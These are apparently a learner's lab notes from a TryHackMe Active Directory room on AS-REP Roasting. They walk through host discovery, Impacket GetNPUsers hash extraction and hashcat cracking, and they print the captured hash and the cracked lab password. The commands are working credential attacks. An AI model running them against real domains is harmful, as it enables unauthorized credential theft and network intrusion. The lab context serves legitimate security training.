
## Learning Objectives

- AS-REP Roasting
- Using the `net` command for enumeration among others
- Enumeration using the ActiveDirectory PowerShell module
- Enumeration using PowerSploit’s PowerView module
- Enumeration with BloodHound

##### Scope: `10.211.12.0/24`

`fping -agq 10.211.12.0/24 -N`

~~~
10.211.12.10
10.211.12.20
10.211.12.100
10.211.12.250
~~~

_________

## AS-REP Roasting Attack

- AS-REP Roasting dumps user account hashes that have Kerberos pre-authentication disabled.
- The only requirement is that the “Do not require Kerberos preauthentication” flag `(UF_DONT_REQUIRE_PREAUTH)` is set on the user account.
- Unlike Kerberoasting, these users do not need to be service accounts.

_____

### Phases of AS-REP Roasting

- AS-REP Roasting involves two main steps: enumeration and exploitation. 
- First, identify vulnerable user accounts. 
- Second capture and crack the retrieved AS-REP hashes offline.

#### Phase 1: Enumeration – Identifying Vulnerable Accounts

- In this phase, you identify user accounts within Active Directory that have Kerberos `pre-authentication disabled`.
- Accounts without pre-authentication allow anyone on the network to request a Kerberos ticket (specifically an AS-REP) without first proving their identity.
- As a result, encrypted hashes of the account passwords become exposed and vulnerable to offline attacks.

#### Tools -

###### 1. Rubeus (Windows Only)

A powerful Windows-based tool designed explicitly for Kerberos-related security testing and enumeration. 

Rubeus **automatically** identifies vulnerable accounts and retrieves encrypted AS-REP hashes and doesn't require a username file to be supplied.

###### 2. Impacket's GetNPUsers.py / `impacket-GetNPUsers`

- A python script to enumerate accounts in non-Windows environments.
- To test for the pre-authentication vulnerability, you must supply a `users.txt` file containing usernames.

**Example Command:** 
`GetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass`

~~~
This command enumerates usernames listed in users.txt and collects AS-REP hashes for vulnerable accounts, saving them in hashes.txt for offline cracking.
~~~


Output - 

```
/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User sshd doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gerald.burgess doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nigel.parsons doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User guy.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jeremy.booth doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User barbara.jones doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User marion.kay doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User kathryn.williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User danny.baker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gary.clarke doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User daniel.turner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User debra.yates doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jeffrey.thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User martin.riley doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User danielle.lee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User douglas.roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User danielle.ali doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User jennifer.harding doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User strategos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User empanadal0v3r doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User drgonz0 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User strate905 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User krbtgtsvc doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$asrepuser1@TRYHACKME.LOC:95bcd6b5292ab9095521793f417590e5$3ea4ab98794abf0d929a83f87e7e417abd911b0f91b6c5b6c60779d2b886449ef71936a21816d5f4428a6d0e7258bd16c22e609b963d3e8b7c93a040d82c7a5c673b804d8b999a82562665c3ebf1c2f8231e5bb76618d773a1b4ae8ad8fd5538fad90333e7a7f5fed593d96778920930ff07e8ed04a2715ff8dac72c4792ae2590610217a7743ced2559b031c92624ce49ca764fc2af5fcf4385cd63d621c93bc07da0f1f7ee08f6853ea64fb9f90a31cf2739bf301c9ba99a5d2ad4a46f6dd0086bee0aebab9ec74e600b2f1a6973642c5d3d1770717200af1d08dece16cfb90453fba58291391bec323405e5ef
[-] User rduke doesn't have UF_DONT_REQUIRE_PREAUTH set

```

`hashes.txt` file - 

~~~
$krb5asrep$23$asrepuser1@TRYHACKME.LOC:95bcd6b5292ab9095521793f417590e5$3ea4ab98794abf0d929a83f87e7e417abd911b0f91b6c5b6c60779d2b886449ef71936a21816d5f4428a6d0e7258bd16c22e609b963d3e8b7c93a040d82c7a5c673b804d8b999a82562665c3ebf1c2f8231e5bb76618d773a1b4ae8ad8fd5538fad90333e7a7f5fed593d96778920930ff07e8ed04a2715ff8dac72c4792ae2590610217a7743ced2559b031c92624ce49ca764fc2af5fcf4385cd63d621c93bc07da0f1f7ee08f6853ea64fb9f90a31cf2739bf301c9ba99a5d2ad4a46f6dd0086bee0aebab9ec74e600b2f1a6973642c5d3d1770717200af1d08dece16cfb90453fba58291391bec323405e5ef
~~~

The user account - `asrepuser1` has kerberos preauth disabled, hence we have successfully obtained its hash.
______

#### Phase 2: Exploitation – Cracking Password Hashes and Accessing the Network

- Once encrypted hashes are obtained in the enumeration phase, the next step involves offline cracking. 
- Recovering valid passwords allows authentication as compromised users, granting further access or privilege escalation within the targeted network.


##### Tool - 

###### `hashcat` - 

mode - `18200`

**Example Command:** `hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt`

```
$krb5asrep$23$asrepuser1@TRYHACKME.LOC:95bcd6b5292ab9095521793f417590e5$3ea4ab98794abf0d929a83f87e7e417abd911b0f91b6c5b6c60779d2b886449ef71936a21816d5f4428a6d0e7258bd16c22e609b963d3e8b7c93a040d82c7a5c673b804d8b999a82562665c3ebf1c2f8231e5bb76618d773a1b4ae8ad8fd5538fad90333e7a7f5fed593d96778920930ff07e8ed04a2715ff8dac72c4792ae2590610217a7743ced2559b031c92624ce49ca764fc2af5fcf4385cd63d621c93bc07da0f1f7ee08f6853ea64fb9f90a31cf2739bf301c9ba99a5d2ad4a46f6dd0086bee0aebab9ec74e600b2f1a6973642c5d3d1770717200af1d08dece16cfb90453fba58291391bec323405e5ef:qwerty123!
                                                          
Session..........: hashcat
Status...........: Cracked

```

Password: `qwerty123!`

_____








